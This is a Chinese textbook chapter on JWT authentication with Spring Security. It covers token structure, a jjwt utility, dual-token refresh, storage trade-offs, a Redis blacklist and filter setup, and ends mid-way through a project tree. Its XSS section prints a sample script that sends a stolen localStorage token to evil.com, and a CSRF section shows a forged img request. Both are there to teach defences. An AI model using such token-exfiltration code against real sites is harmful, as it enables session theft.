# 第24章：JWT令牌与分布式会话

## 本章目标

学完本章你将能够：

- 理解Session和JWT两种会话管理机制的原理、优劣和适用场景
- 掌握JWT的三段式结构（Header.Payload.Signature），能手写解析一个JWT
- 使用jjwt库编写完整的JwtUtil工具类（生成AccessToken/RefreshToken、解析、校验）
- 实现双Token刷新机制，理解AccessToken和RefreshToken的分工
- 对比LocalStorage和httpOnly Cookie两种Token存储方案的安全风险
- 实现Token黑名单机制，解决JWT无法主动失效的问题
- 将JWT认证过滤器整合到Spring Security过滤器链中
- 交付EMS v7：安全版员工管理系统

---

## 24.1 Session vs JWT

### 24.1.1 Session模式回顾

传统Web应用使用Session管理用户会话：

```
┌──────────┐                    ┌──────────┐
│  浏览器   │                    │  服务器   │
└────┬─────┘                    └────┬─────┘
     │   1. POST /login (user+pwd)  │
     │ ──────────────────────────► │
     │                              │ 2. 验证成功，创建Session
     │                              │    Session存入内存/Redis
     │   3. Set-Cookie: JSESSIONID=xxx │
     │ ◄────────────────────────── │
     │                              │
     │   4. GET /api/user (Cookie自动携带) │
     │ ──────────────────────────► │
     │                              │ 5. 根据JSESSIONID查找Session
     │   6. 返回用户数据             │    找到→认证通过
     │ ◄────────────────────────── │
```

Session模式的问题：

| 问题 | 说明 |
|------|------|
| **服务器存状态** | 每个在线用户占一份内存，用户量大了内存压力大 |
| **分布式困难** | 多台服务器时Session不共享，用户请求到另一台服务器就"掉线" |
| **扩展性差** | 水平扩展需要引入Session粘滞（Sticky Session）或Session复制 |
| **跨域问题** | Cookie默认不跨域，前后端分离+微服务场景下复杂 |
| **移动端不友好** | 原生App没有Cookie机制 |

### 24.1.2 JWT模式

JWT（JSON Web Token）是一种无状态的认证方案——服务器不存储会话信息，所有认证信息都编码在Token中：

```
┌──────────┐                    ┌──────────┐
│  客户端   │                    │  服务器   │
└────┬─────┘                    └────┬─────┘
     │   1. POST /login (user+pwd)  │
     │ ──────────────────────────► │
     │                              │ 2. 验证成功，生成JWT
     │   3. 返回JWT Token           │    (服务器不存储！)
     │ ◄────────────────────────── │
     │                              │
     │   4. GET /api/user           │
     │   Authorization: Bearer xxx  │
     │ ──────────────────────────► │
     │                              │ 5. 验证JWT签名+有效期
     │   6. 返回用户数据             │    通过→认证通过
     │ ◄────────────────────────── │
```

### 24.1.3 Session vs JWT对比

| 对比项 | Session | JWT |
|--------|---------|-----|
| **状态** | 有状态（服务器存Session） | 无状态（Token自包含） |
| **存储** | 服务器内存/Redis | 客户端（LocalStorage/Cookie） |
| **扩展性** | 需要Session共享 | 天然支持分布式 |
| **安全性** | Session ID可被劫持 | Token可被窃取 |
| **主动失效** | 销毁Session即可 | 🚨 无法主动失效（签发即有效） |
| **payload可见** | 不可见（服务器端存储） | 🚨 可解码（Base64编码，非加密） |
| **跨域** | Cookie跨域受限 | 请求头携带，天然跨域 |
| **适用场景** | 传统服务端渲染 | 前后端分离/微服务/移动端 |

> 🚨 **坑：JWT的payload不加密！** JWT的Payload部分只是Base64Url编码，任何拿到Token的人都能用`atob()`或在线工具解码查看内容。**绝对不要在JWT中存放密码、身份证号等敏感信息。** 只放用户ID、用户名、角色等非敏感标识信息。

> 🚨 **坑：JWT无法主动失效！** 一旦签发了JWT，在过期时间之前它始终有效——即使你已经修改了密码或注销了账号。解决方案是维护Token黑名单（通常用Redis），下一节详细讨论。

---

## 24.2 JWT结构详解

### 24.2.1 三段式结构

一个JWT长这样：

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTcwMzE0NTYwMCwiZXhwIjoxNzAzMTQ2NTAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
│          │                                              │
│  Header  │                  Payload                     │  Signature
│  (头部)  │                  (载荷)                       │  (签名)
```

三部分用`.`分隔，每部分都是Base64Url编码。

### 24.2.2 Header（头部）

```json
{
    "alg": "HS256",
    "typ": "JWT"
}
```

| 字段 | 含义 | 常见值 |
|------|------|--------|
| `alg` | 签名算法 | HS256、RS256、ES256 |
| `typ` | 令牌类型 | JWT |

Base64Url编码后：`eyJhbGciOiJIUzI1NiJ9`

### 24.2.3 Payload（载荷）

```json
{
    "sub": "admin",
    "iat": 1703145600,
    "exp": 1703146500
}
```

**Registered Claims（注册声明，非强制但推荐）**：

| 字段 | 含义 | 说明 |
|------|------|------|
| `iss` | 签发者 | 如`ems-security` |
| `sub` | 主题 | 通常是用户名或用户ID |
| `aud` | 接收者 | 目标服务 |
| `exp` | 过期时间 | Unix时间戳 |
| `nbf` | 生效时间 | 此时间之前Token无效 |
| `iat` | 签发时间 | Unix时间戳 |
| `jti` | JWT ID | 唯一标识，可用于黑名单 |

**自定义Claims（业务数据）**：

```json
{
    "sub": "admin",
    "userId": 1,
    "roles": ["ADMIN"],
    "iat": 1703145600,
    "exp": 1703146500
}
```

### 24.2.4 Signature（签名）

签名生成公式：

```
HMACSHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    secret
)
```

签名的目的是**防篡改**：如果有人修改了Payload中的内容（比如把角色从USER改成ADMIN），签名验证就会失败，因为签名是用原始Header和Payload加上密钥计算的，修改后重新计算的签名与原签名不匹配。

> 🚨 **坑：HS256使用对称密钥，密钥泄露后任何人都能签发Token！** HS256的签名和验证使用同一个密钥，一旦泄露，攻击者可以伪造任意Token。生产环境建议使用RS256（非对称算法）：私钥签名，公钥验证，即使公钥泄露也无法伪造Token。

### 24.2.5 在线验证

打开 [jwt.io](https://jwt.io)，粘贴你的JWT，可以实时查看解码结果和验证签名。调试时非常方便。

---

## 24.3 JWT认证实战

### 24.3.1 引入jjwt依赖

```xml
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.12.6</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.12.6</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>
    <version>0.12.6</version>
    <scope>runtime</scope>
</dependency>
```

> 🚨 **坑：jjwt 0.12+ API变化很大！** 0.11及以前版本使用`Jwts.parser().setSigningKey(key).parseClaimsJws(token)`，0.12+改为`Jwts.parser().verifyWith(key).build().parseSignedClaims(token)`。网上大量教程还在用旧API，照抄会编译报错。

### 24.3.2 配置JWT参数

```yaml
jwt:
  secret: ${JWT_SECRET:myDefaultSecretKeyForDevelopmentOnlyDoNotUseInProduction2024}
  access-token-expiration: 1800000
  refresh-token-expiration: 604800000
  issuer: ems-security
```

```java
@Configuration
@ConfigurationProperties(prefix = "jwt")
@Data
public class JwtProperties {

    private String secret;
    private long accessTokenExpiration;
    private long refreshTokenExpiration;
    private String issuer;
}
```

> 🚨 **坑：密钥不能硬编码在代码中！** 示例中的默认值仅供开发环境使用。生产环境必须通过环境变量`JWT_SECRET`注入，且密钥长度至少256位（32字节）以满足HS256要求。更好的做法是使用RS256非对称算法。

### 24.3.3 JwtUtil工具类完整代码

```java
@Component
public class JwtUtil {

    private final JwtProperties jwtProperties;
    private final SecretKey secretKey;

    public JwtUtil(JwtProperties jwtProperties) {
        this.jwtProperties = jwtProperties;
        this.secretKey = Keys.hmacShaKeyFor(
            jwtProperties.getSecret().getBytes(StandardCharsets.UTF_8));
    }

    public String generateAccessToken(Long userId, String username,
                                      List<String> roles) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("userId", userId);
        claims.put("roles", roles);

        return Jwts.builder()
            .claims(claims)
            .subject(username)
            .issuer(jwtProperties.getIssuer())
            .issuedAt(new Date())
            .expiration(new Date(System.currentTimeMillis()
                + jwtProperties.getAccessTokenExpiration()))
            .signWith(secretKey)
            .compact();
    }

    public String generateRefreshToken(Long userId, String username) {
        return Jwts.builder()
            .subject(username)
            .claim("userId", userId)
            .claim("type", "refresh")
            .issuer(jwtProperties.getIssuer())
            .issuedAt(new Date())
            .expiration(new Date(System.currentTimeMillis()
                + jwtProperties.getRefreshTokenExpiration()))
            .signWith(secretKey)
            .compact();
    }

    public Claims parseToken(String token) {
        return Jwts.parser()
            .verifyWith(secretKey)
            .build()
            .parseSignedClaims(token)
            .getPayload();
    }

    public boolean validateToken(String token) {
        try {
            parseToken(token);
            return true;
        } catch (ExpiredJwtException e) {
            return false;
        } catch (JwtException e) {
            return false;
        }
    }

    public String getUsernameFromToken(String token) {
        return parseToken(token).getSubject();
    }

    public Long getUserIdFromToken(String token) {
        return parseToken(token).get("userId", Long.class);
    }

    @SuppressWarnings("unchecked")
    public List<String> getRolesFromToken(String token) {
        Object roles = parseToken(token).get("roles");
        if (roles instanceof List) {
            return (List<String>) roles;
        }
        return Collections.emptyList();
    }

    public boolean isTokenExpired(String token) {
        try {
            return parseToken(token).getExpiration().before(new Date());
        } catch (ExpiredJwtException e) {
            return true;
        }
    }

    public boolean isRefreshToken(String token) {
        try {
            return "refresh".equals(parseToken(token).get("type", String.class));
        } catch (JwtException e) {
            return false;
        }
    }
}
```

> 🚨 **坑：Token过期时间设置要平衡安全和体验！** 太短（如5分钟）→ 用户频繁重新登录；太长（如7天）→ Token泄露后风险窗口大。**推荐：AccessToken 15-30分钟，RefreshToken 7-30天。**

### 24.3.4 登录接口完整实现

```java
@RestController
@RequestMapping("/api/auth")
public class AuthController {

    private final AuthenticationManager authenticationManager;
    private final JwtUtil jwtUtil;
    private final CustomUserDetailsService userDetailsService;

    public AuthController(AuthenticationManager authenticationManager,
                          JwtUtil jwtUtil,
                          CustomUserDetailsService userDetailsService) {
        this.authenticationManager = authenticationManager;
        this.jwtUtil = jwtUtil;
        this.userDetailsService = userDetailsService;
    }

    @PostMapping("/login")
    public Result<LoginVO> login(@RequestBody @Valid LoginDTO loginDTO) {
        Authentication authentication = authenticationManager.authenticate(
            new UsernamePasswordAuthenticationToken(
                loginDTO.getUsername(),
                loginDTO.getPassword()
            )
        );

        SecurityUser user = (SecurityUser) authentication.getPrincipal();

        List<String> roles = user.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .filter(auth -> auth.startsWith("ROLE_"))
            .map(auth -> auth.substring(5))
            .collect(Collectors.toList());

        String accessToken = jwtUtil.generateAccessToken(
            user.getId(), user.getUsername(), roles);
        String refreshToken = jwtUtil.generateRefreshToken(
            user.getId(), user.getUsername());

        LoginVO loginVO = new LoginVO();
        loginVO.setAccessToken(accessToken);
        loginVO.setRefreshToken(refreshToken);
        loginVO.setTokenType("Bearer");
        loginVO.setExpiresIn(jwtUtil.parseToken(accessToken)
            .getExpiration().getTime() - System.currentTimeMillis());
        loginVO.setUserId(user.getId());
        loginVO.setUsername(user.getUsername());
        loginVO.setRoles(roles);

        return Result.success(loginVO);
    }
}
```

```java
@Data
public class LoginDTO {
    @NotBlank(message = "用户名不能为空")
    private String username;

    @NotBlank(message = "密码不能为空")
    private String password;
}
```

```java
@Data
public class LoginVO {
    private String accessToken;
    private String refreshToken;
    private String tokenType;
    private Long expiresIn;
    private Long userId;
    private String username;
    private List<String> roles;
}
```

---

## 24.4 双Token刷新机制

### 24.4.1 为什么需要双Token

单Token方案面临一个两难困境：

- Token有效期长 → 泄露风险大
- Token有效期短 → 用户频繁重新登录，体验差

双Token方案优雅地解决了这个问题：

| Token | 有效期 | 用途 | 存储位置 |
|-------|--------|------|---------|
| **AccessToken** | 15-30分钟 | 访问受保护资源 | 内存/LocalStorage |
| **RefreshToken** | 7-30天 | 刷新AccessToken | httpOnly Cookie / 后端Redis |

AccessToken短期有效，即使泄露影响有限；RefreshToken长期有效但只在刷新时使用，使用频率低，可以采用更安全的存储方式。

### 24.4.2 刷新流程图

```
┌──────────┐                              ┌──────────┐
│   前端    │                              │   后端    │
└────┬─────┘                              └────┬─────┘
     │                                         │
     │  1. 正常请求（携带AccessToken）          │
     │  Authorization: Bearer <access_token>   │
     │ ─────────────────────────────────────► │
     │                                         │
     │  2. 正常响应                             │
     │ ◄───────────────────────────────────── │
     │                                         │
     │  ══════════════════════════════════════ │
     │                                         │
     │  3. 请求（AccessToken已过期）            │
     │  Authorization: Bearer <expired_token>  │
     │ ─────────────────────────────────────► │
     │                                         │
     │  4. 返回401 + "Token expired"           │
     │ ◄───────────────────────────────────── │
     │                                         │
     │  5. 自动触发刷新请求                     │
     │  POST /api/auth/refresh                 │
     │  Cookie: refreshToken=xxx               │
     │ ─────────────────────────────────────► │
     │                                         │
     │  6. 验证RefreshToken                    │
     │     ├── 解析JWT签名和有效期              │
     │     ├── 检查Redis中是否存在              │
     │     ├── 加载用户最新权限                  │
     │     └── 生成新AccessToken                │
     │                                         │
     │  7. 返回新AccessToken                    │
     │ ◄───────────────────────────────────── │
     │                                         │
     │  8. 用新Token重发原始请求                 │
     │  Authorization: Bearer <new_access>     │
     │ ─────────────────────────────────────► │
     │                                         │
     │  9. 正常响应                             │
     │ ◄───────────────────────────────────── │
     │                                         │
     │  ══════════════════════════════════════ │
     │                                         │
     │  如果RefreshToken也过期：                │
     │                                         │
     │  10. 返回401 + "RefreshToken expired"   │
     │ ◄───────────────────────────────────── │
     │                                         │
     │  11. 跳转登录页                          │
     │  router.push('/login')                  │
     │ ──►                                     │
```

### 24.4.3 刷新接口实现

```java
@RestController
@RequestMapping("/api/auth")
public class AuthController {

    private final JwtUtil jwtUtil;
    private final CustomUserDetailsService userDetailsService;

    @PostMapping("/refresh")
    public Result<RefreshVO> refreshToken(
            @CookieValue(name = "refreshToken", required = false)
            String refreshToken) {

        if (refreshToken == null || refreshToken.isEmpty()) {
            throw new BusinessException(401, "RefreshToken不存在，请重新登录");
        }

        if (!jwtUtil.validateToken(refreshToken)) {
            throw new BusinessException(401, "RefreshToken已过期，请重新登录");
        }

        if (!jwtUtil.isRefreshToken(refreshToken)) {
            throw new BusinessException(401, "无效的RefreshToken");
        }

        String username = jwtUtil.getUsernameFromToken(refreshToken);
        Long userId = jwtUtil.getUserIdFromToken(refreshToken);

        UserDetails userDetails =
            userDetailsService.loadUserByUsername(username);

        List<String> roles = userDetails.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .filter(auth -> auth.startsWith("ROLE_"))
            .map(auth -> auth.substring(5))
            .collect(Collectors.toList());

        String newAccessToken = jwtUtil.generateAccessToken(
            userId, username, roles);

        RefreshVO vo = new RefreshVO();
        vo.setAccessToken(newAccessToken);
        vo.setTokenType("Bearer");
        vo.setExpiresIn(jwtUtil.parseToken(newAccessToken)
            .getExpiration().getTime() - System.currentTimeMillis());

        return Result.success(vo);
    }
}
```

### 24.4.4 RefreshToken存储策略

RefreshToken的存储是安全设计的关键环节：

| 存储方式 | XSS风险 | CSRF风险 | 推荐度 |
|---------|---------|---------|--------|
| **LocalStorage** | 🔴 高（JS可直接读取） | 🟢 低（不自动发送） | ❌ 不推荐 |
| **httpOnly Cookie** | 🟢 低（JS不可读） | 🟡 中（自动发送，需CSRF防护） | ✅ 推荐 |
| **SessionStorage** | 🔴 高（JS可读取） | 🟢 低 | ❌ 不推荐 |
| **内存变量** | 🟢 低 | 🟢 低 | ⚠️ 刷新页面丢失 |

> 🚨 **坑：RefreshToken放在LocalStorage → XSS攻击可读取！** 如果网站存在XSS漏洞，攻击者可以通过注入的JS脚本读取LocalStorage中的Token。**推荐做法：RefreshToken存httpOnly Cookie，AccessToken存内存变量。**

httpOnly Cookie设置方式：

```java
private void setRefreshTokenCookie(HttpServletResponse response,
                                    String refreshToken) {
    Cookie cookie = new Cookie("refreshToken", refreshToken);
    cookie.setHttpOnly(true);
    cookie.setSecure(true);
    cookie.setPath("/api/auth/refresh");
    cookie.setMaxAge(7 * 24 * 3600);
    response.addCookie(cookie);
}
```

关键属性：
- `httpOnly=true`：JavaScript无法通过`document.cookie`读取
- `secure=true`：仅HTTPS传输（生产环境必须）
- `path=/api/auth/refresh`：只在刷新接口自动携带，减少暴露面
- `maxAge`：与RefreshToken有效期一致

### 24.4.5 前端Axios拦截器实现无感刷新

```javascript
import axios from 'axios'
import router from '@/router'

const request = axios.create({
  baseURL: '/api',
  timeout: 10000
})

let isRefreshing = false
let pendingRequests = []

request.interceptors.request.use(config => {
  const accessToken = localStorage.getItem('accessToken')
  if (accessToken) {
    config.headers.Authorization = `Bearer ${accessToken}`
  }
  return config
})

request.interceptors.response.use(
  response => response.data,
  async error => {
    const originalRequest = error.config

    if (error.response?.status === 401
        && !originalRequest._retry) {

      if (isRefreshing) {
        return new Promise((resolve, reject) => {
          pendingRequests.push({
            resolve,
            reject,
            config: originalRequest
          })
        })
      }

      originalRequest._retry = true
      isRefreshing = true

      try {
        const res = await axios.post('/api/auth/refresh')
        const newAccessToken = res.data.data.accessToken
        localStorage.setItem('accessToken', newAccessToken)

        pendingRequests.forEach(({ resolve, reject, config }) => {
          config.headers.Authorization = `Bearer ${newAccessToken}`
          resolve(request(config))
        })
        pendingRequests = []

        originalRequest.headers.Authorization =
          `Bearer ${newAccessToken}`
        return request(originalRequest)
      } catch (refreshError) {
        pendingRequests.forEach(({ reject }) => reject(refreshError))
        pendingRequests = []
        localStorage.removeItem('accessToken')
        router.push('/login')
        return Promise.reject(refreshError)
      } finally {
        isRefreshing = false
      }
    }

    return Promise.reject(error)
  }
)

export default request
```

**关键设计**：

1. **互斥锁（`isRefreshing`）**：多个请求同时401时，只触发一次刷新，其他请求排队等待
2. **请求队列（`pendingRequests`）**：刷新成功后，用新Token重发所有排队的请求
3. **刷新失败**：清除Token，跳转登录页
4. **`_retry`标记**：防止刷新请求本身也401时无限循环

---

## 24.5 Token安全

### 24.5.1 XSS攻击与Token窃取

XSS（Cross-Site Scripting）攻击者可以注入恶意JavaScript到你的网页中：

```javascript
// 攻击者注入的脚本
const token = localStorage.getItem('accessToken')
fetch('https://evil.com/steal?token=' + token)
```

防御措施：

| 措施 | 说明 |
|------|------|
| **AccessToken存内存** | 不持久化，页面刷新后丢失（配合RefreshToken自动恢复） |
| **httpOnly Cookie** | JS无法读取，XSS无法窃取 |
| **CSP头** | Content-Security-Policy限制脚本来源 |
| **输入过滤** | 对用户输入进行HTML转义 |
| **XSS扫描** | 使用工具检测XSS漏洞 |

### 24.5.2 CSRF攻击

CSRF（Cross-Site Request Forgery）利用浏览器自动携带Cookie的特性：

```html
<!-- 攻击者网站上的恶意代码 -->
<img src="https://your-api.com/api/employee/delete/1">
<!-- 浏览器会自动携带Cookie，如果Cookie中有认证信息，请求就会成功 -->
```

JWT的天然优势：**JWT放在请求头`Authorization`中，浏览器不会自动携带**，因此CSRF攻击对JWT基本无效。但如果将JWT存在Cookie中，就需要注意CSRF防护。

### 24.5.3 httpOnly Cookie vs LocalStorage完整对比

| 安全维度 | httpOnly Cookie | LocalStorage |
|---------|----------------|-------------|
| **XSS读取** | ✅ 不可读 | ❌ 可读取 |
| **CSRF攻击** | ⚠️ 需额外防护 | ✅ 不受影响 |
| **跨域携带** | 需配置SameSite/CORS | 不自动发送 |
| **过期管理** | 浏览器自动管理 | 需手动管理 |
| **子域共享** | 可配置domain共享 | 严格同源 |
| **移动端** | WebView支持 | 支持 |

**最佳实践方案**：

```
AccessToken  → 存内存变量（或LocalStorage，接受XSS风险换取便利）
RefreshToken → 存httpOnly Cookie（安全性优先）
```

### 24.5.4 Token黑名单

JWT无法主动失效是最大的安全缺陷。解决方案是维护一个**Token黑名单**（通常用Redis存储）：

```java
@Service
public class TokenBlacklistService {

    private final StringRedisTemplate redisTemplate;

    public TokenBlacklistService(StringRedisTemplate redisTemplate) {
        this.redisTemplate = redisTemplate;
    }

    public void addToBlacklist(String token, long remainingMillis) {
        String key = "token:blacklist:" + token;
        redisTemplate.opsForValue().set(
            key, "1", remainingMillis, TimeUnit.MILLISECONDS);
    }

    public boolean isBlacklisted(String token) {
        String key = "token:blacklist:" + token;
        return Boolean.TRUE.equals(
            redisTemplate.hasKey(key));
    }
}
```

**黑名单的过期时间 = Token的剩余有效期**。Token过期后黑名单记录自动清除，不会无限膨胀。

### 24.5.5 退出登录实现

```java
@PostMapping("/logout")
public Result<Void> logout(HttpServletRequest request,
                           HttpServletResponse response) {

    String token = extractToken(request);

    if (token != null && jwtUtil.validateToken(token)) {
        Claims claims = jwtUtil.parseToken(token);
        long remainingMillis = claims.getExpiration().getTime()
            - System.currentTimeMillis();

        if (remainingMillis > 0) {
            tokenBlacklistService.addToBlacklist(token, remainingMillis);
        }
    }

    Cookie cookie = new Cookie("refreshToken", null);
    cookie.setHttpOnly(true);
    cookie.setPath("/api/auth/refresh");
    cookie.setMaxAge(0);
    response.addCookie(cookie);

    return Result.success();
}
```

### 24.5.6 修改密码/角色变更时使旧Token失效

当用户修改密码或角色变更时，需要让该用户之前签发的所有Token失效：

```java
@Service
public class TokenInvalidationService {

    private final StringRedisTemplate redisTemplate;

    public TokenInvalidationService(StringRedisTemplate redisTemplate) {
        this.redisTemplate = redisTemplate;
    }

    public void invalidateAllUserTokens(Long userId) {
        String key = "user:token:invalidated:" + userId;
        redisTemplate.opsForValue().set(
            key,
            String.valueOf(System.currentTimeMillis()),
            30, TimeUnit.DAYS
        );
    }

    public boolean isUserInvalidated(Long userId, long tokenIssuedAt) {
        String key = "user:token:invalidated:" + userId;
        String value = redisTemplate.opsForValue().get(key);
        if (value == null) {
            return false;
        }
        long invalidatedSince = Long.parseLong(value);
        return tokenIssuedAt < invalidatedSince;
    }
}
```

原理：记录用户最后一次密码修改/角色变更的时间戳，JWT验证时检查Token的签发时间是否早于该时间戳——如果早于，说明Token是在变更前签发的，应视为无效。

---

## 24.6 Security + JWT整合

### 24.6.1 JwtAuthenticationFilter

JWT认证的核心是一个过滤器，它从请求头中提取Token，验证后设置Spring Security的认证上下文：

```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtUtil jwtUtil;
    private final CustomUserDetailsService userDetailsService;
    private final TokenBlacklistService tokenBlacklistService;
    private final TokenInvalidationService invalidationService;
    private final ObjectMapper objectMapper;

    public JwtAuthenticationFilter(JwtUtil jwtUtil,
                                   CustomUserDetailsService userDetailsService,
                                   TokenBlacklistService tokenBlacklistService,
                                   TokenInvalidationService invalidationService,
                                   ObjectMapper objectMapper) {
        this.jwtUtil = jwtUtil;
        this.userDetailsService = userDetailsService;
        this.tokenBlacklistService = tokenBlacklistService;
        this.invalidationService = invalidationService;
        this.objectMapper = objectMapper;
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain)
            throws ServletException, IOException {

        String token = extractToken(request);

        if (token != null) {
            try {
                if (tokenBlacklistService.isBlacklisted(token)) {
                    sendErrorResponse(response, 401, "Token已失效，请重新登录");
                    return;
                }

                Claims claims = jwtUtil.parseToken(token);

                if (invalidationService.isUserInvalidated(
                        claims.get("userId", Long.class),
                        claims.getIssuedAt().getTime())) {
                    sendErrorResponse(response, 401, "凭证已过期，请重新登录");
                    return;
                }

                String username = claims.getSubject();

                if (username != null
                    && SecurityContextHolder.getContext()
                        .getAuthentication() == null) {

                    UserDetails userDetails =
                        userDetailsService.loadUserByUsername(username);

                    UsernamePasswordAuthenticationToken authToken =
                        new UsernamePasswordAuthenticationToken(
                            userDetails, null, userDetails.getAuthorities());

                    authToken.setDetails(
                        new WebAuthenticationDetailsSource()
                            .buildDetails(request));

                    SecurityContextHolder.getContext()
                        .setAuthentication(authToken);
                }
            } catch (ExpiredJwtException e) {
                sendErrorResponse(response, 401, "Token已过期");
                return;
            } catch (JwtException e) {
                sendErrorResponse(response, 401, "无效的Token");
                return;
            }
        }

        filterChain.doFilter(request, response);
    }

    private String extractToken(HttpServletRequest request) {
        String bearerToken = request.getHeader("Authorization");
        if (bearerToken != null && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7);
        }
        return null;
    }

    private void sendErrorResponse(HttpServletResponse response,
                                    int status, String message)
            throws IOException {
        Result<Void> result = Result.error(status, message);
        response.setContentType("application/json;charset=UTF-8");
        response.setStatus(status);
        response.getWriter().write(
            objectMapper.writeValueAsString(result));
    }
}
```

> 🚨 **坑：过滤器中抛出的异常不会被@ControllerAdvice捕获！** Spring Security的过滤器在DispatcherServlet之前执行，而@ControllerAdvice只能处理Controller层抛出的异常。因此，过滤器中的异常必须自己处理——在catch块中直接写JSON响应。

### 24.6.2 过滤器在链中的位置

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class SecurityConfig {

    private final JwtAuthenticationFilter jwtAuthenticationFilter;
    private final JsonAuthenticationEntryPoint entryPoint;
    private final JsonAccessDeniedHandler deniedHandler;

    public SecurityConfig(JwtAuthenticationFilter jwtAuthenticationFilter,
                          JsonAuthenticationEntryPoint entryPoint,
                          JsonAccessDeniedHandler deniedHandler) {
        this.jwtAuthenticationFilter = jwtAuthenticationFilter;
        this.entryPoint = entryPoint;
        this.deniedHandler = deniedHandler;
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/login",
                                 "/api/auth/register",
                                 "/api/auth/refresh").permitAll()
                .requestMatchers("/swagger-ui/**",
                                 "/v3/api-docs/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint(entryPoint)
                .accessDeniedHandler(deniedHandler)
            )
            .addFilterBefore(jwtAuthenticationFilter,
                UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }

    @Bean
    public AuthenticationManager authenticationManager(
            AuthenticationConfiguration config) throws Exception {
        return config.getAuthenticationManager();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOriginPatterns(List.of("*"));
        configuration.setAllowedMethods(
            List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        configuration.setAllowedHeaders(List.of("*"));
        configuration.setAllowCredentials(true);
        configuration.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source =
            new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", configuration);
        return source;
    }
}
```

**`addFilterBefore`的位置选择**：

JWT过滤器放在`UsernamePasswordAuthenticationFilter`之前，这样：

1. 请求先经过JWT过滤器 → 如果携带有效Token，直接设置认证上下文
2. 不经过表单登录流程 → JWT模式下不需要`UsernamePasswordAuthenticationFilter`
3. 如果JWT过滤器没有设置认证上下文 → 后续的`AuthorizationFilter`会检查到未认证，触发401

过滤器链执行顺序：

```
HTTP请求
  → CorsFilter
  → CsrfFilter (disabled)
  → JwtAuthenticationFilter (我们添加的)
  → UsernamePasswordAuthenticationFilter (跳过，JWT模式不用)
  → ExceptionTranslationFilter
  → AuthorizationFilter
  → Controller
```

### 24.6.3 完整认证流程总结

```
┌─────────────────────────────────────────────────────────────┐
│                     登录流程                                  │
│                                                             │
│  POST /api/auth/login {username, password}                  │
│       │                                                     │
│       ▼                                                     │
│  AuthenticationManager.authenticate()                       │
│       │                                                     │
│       ├── 验证用户名密码                                      │
│       │   (UserDetailsService + BCryptPasswordEncoder)       │
│       │                                                     │
│       ├── 生成AccessToken (15-30分钟)                        │
│       ├── 生成RefreshToken (7-30天)                          │
│       │                                                     │
│       └── 返回JSON:                                          │
│           {                                                  │
│             accessToken: "eyJ...",                           │
│             refreshToken: "eyJ...",  ← 同时设为httpOnly Cookie│
│             tokenType: "Bearer",                             │
│             expiresIn: 1800000                               │
│           }                                                  │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                   受保护资源访问                               │
│                                                             │
│  GET /api/employee/list                                     │
│  Authorization: Bearer eyJ...                               │
│       │                                                     │
│       ▼                                                     │
│  JwtAuthenticationFilter                                    │
│       │                                                     │
│       ├── 提取Token                                          │
│       ├── 验证签名                                           │
│       ├── 检查黑名单                                         │
│       ├── 检查用户失效标记                                     │
│       ├── 加载用户权限                                        │
│       └── 设置SecurityContext                                │
│                                                             │
│       ▼                                                     │
│  AuthorizationFilter (URL级别权限)                            │
│       │                                                     │
│       ▼                                                     │
│  @PreAuthorize (方法级别权限)                                 │
│       │                                                     │
│       ▼                                                     │
│  Controller → Service → Mapper → DB                         │
└─────────────────────────────────────────────────────────────┘
```

---

## 24.7 EMS v7：安全版员工管理系统

### 24.7.1 项目概述

EMS v7在v6（Vue前端全栈版）的基础上，加入完整的安全体系：

| 安全特性 | 实现方式 |
|---------|---------|
| 认证 | Spring Security + JWT双Token |
| 密码存储 | BCryptPasswordEncoder |
| 权限模型 | RBAC五表 |
| URL权限 | SecurityFilterChain配置 |
| 方法权限 | @PreAuthorize |
| Token刷新 | 双Token + httpOnly Cookie |
| Token注销 | Redis黑名单 |
| 前端路由守卫 | Vue Router beforeEach |

### 24.7.2 项目结构

```
ems-v7/
├── src/main/java/com/example/ems/
│   ├── config/
│   │   ├── SecurityConfig.java
│   │   ├── JwtProperties.java
│   │   └── CorsConfig.java
│   ├── security/
│   │   ├── JwtUtil.java
│   │   ├── JwtAuthenticationFilter.java
│   │   ├── CustomUserDetailsService.java
│   │   ├── SecurityUser.java
│   │   ├── JsonAuthenticationEntryPoint.java
│   │   └── JsonAccessDeniedHandler.java
│   ├── service/
│   │   ├── TokenBlacklistService.java
│   │   ├── TokenInvalidationService.java
│   │   ├── AuthService.java
│   │   └── EmployeeService.java
│   ├── controller/
│   │   ├── AuthController.java
│   │   └── EmployeeController.java
│   ├── entity/
│   │   ├── User.java
│   │   ├── Role.java
│   │   └── Permission.java
│   ├── mapper/
